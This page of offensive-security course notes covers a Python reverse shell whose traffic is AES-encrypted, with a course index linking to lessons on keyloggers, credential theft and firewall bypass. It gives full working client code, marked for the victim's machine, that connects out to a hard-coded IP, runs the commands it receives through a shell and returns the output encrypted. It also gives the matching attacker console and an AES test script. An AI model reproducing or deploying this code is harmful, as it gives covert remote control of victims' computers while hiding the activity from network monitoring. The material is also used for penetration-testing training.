---
title: TCP reverse shell with AES encryption
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - encryption
  - aes
---

# TCP reverse shell with AES encryption

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Client side

To be run on the victim's machine.

```python
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import socket
import subprocess
key = b"H" * 32
IV = b"H" * 16

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    while True:
        command = decrypt(s.recv(1024))
        if 'terminate' in command.decode():
             break
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read()))
            

def main():
    connect()
main()

```


## Server side

```python
import socket

from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16 # this must match the block size, which is 16 byte
key = b"H" * 32 # 32 goes for AES 256

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16) # pad function is to add the necessary extra data to make sure that the size of the padded_message is 16 bytes or a multiple of 16. This is explained because cipher block chaining encryption uses blocks of 16bytes.
    encrypted_message = encryptor.encrypt(padded_message) 
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect():

    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    conn, address = s.accept()
    print('[+] We got a connection')
    while True:

        command = input("Shell> ")
        if 'terminate' in command:
            conn.send(encrypt(b'terminate'))
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            print(decrypt(conn.recv(1024)).decode())
def main():
    connect()

main()

```


## Test

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

key = b"H" * 32 #AES keys may be 128 bits (16 bytes), 192 bits (24 bytes) or 256 bits (32 bytes) long.
IV = b"H" * 16

cipher = AES.new(key, AES.MODE_CBC, IV)

message = "Hello"
paddedmessage = Padding.pad(message.encode(), 16)
encrypted = cipher.encrypt(paddedmessage)

print (encrypted)


decipher = AES.new(key, AES.MODE_CBC, IV)
paddeddecrypted = decipher.decrypt(encrypted)
unpaddedencrypted = Padding.unpad(paddeddecrypted, 16)

print(unpaddedencrypted.decode())

```